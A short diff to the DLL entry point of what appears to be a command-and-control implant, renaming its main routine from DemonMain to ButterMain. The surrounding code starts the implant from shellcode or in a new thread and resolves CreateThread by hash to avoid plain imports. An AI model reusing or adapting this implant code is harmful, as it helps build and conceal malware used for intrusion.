@@ -39,7 +39,7 @@ DLLEXPORT BOOL WINAPI DllMain(
 
 #ifdef SHELLCODE
         /* we dont need to make a new thread since we get loaded by our shellcode */
-        DemonMain( hDllBase, Reserved );
+        ButterMain( hDllBase, Reserved );
 #else
         /* if we don't compile for the shellcode then start a new thread.
          * why? because if not then we get an ERROR_INVALID_STATE from WinHttpSendRequest
@@ -55,7 +55,7 @@ DLLEXPORT BOOL WINAPI DllMain(
         ) = LdrFunctionAddr( Kernel32, H_FUNC_CREATETHREAD ); /* you can load another function here using
                                                                  * LdrModulePeb or LdrModuleLoad then LdrFunctionAddr */
 
-        NewThread( NULL, 0, C_PTR( DemonMain ), hDllBase, 0, NULL );
+        NewThread( NULL, 0, C_PTR( ButterMain ), hDllBase, 0, NULL );
 #endif
         return TRUE;
     }
